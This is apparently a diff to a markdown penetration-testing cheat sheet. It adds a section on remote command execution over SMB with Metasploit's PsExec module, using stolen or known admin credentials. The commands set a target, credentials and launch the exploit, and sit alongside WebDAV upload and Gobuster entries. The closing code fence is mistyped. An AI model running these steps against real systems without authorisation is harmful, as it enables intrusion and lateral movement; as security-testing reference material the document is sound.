@@ -146,8 +146,27 @@ set HttpUsername
 set HttpPassword 
 set PATH /webdav/%RAND%.asp
 ```
+## PsExec SMB Remote Code Execution
 
+Leverages valid SMB credentials to remotely execute commands on a Windows machine using the **PsExec** technique. This method does **not exploit a vulnerability**, but instead uses **legitimate admin access** over SMB (port 445) to gain a foothold or move laterally.
 
+```bash
+# Start Metasploit without banner (quieter startup)
+msfconsole -q
+
+# Load PsExec exploit module
+use exploit/windows/smb/psexec
+
+# Set the remote target
+set RHOSTS <target-ip-or-host>
+
+# Provide SMB credentials (must be a local admin on the target)
+set SMBUser <username>
+set SMBPass <password>
+
+# Launch the exploit (starts a session)
+exploit
+'''
 ## Directory Discovery with Gobuster
 
 | Description             | Command                                                                 |
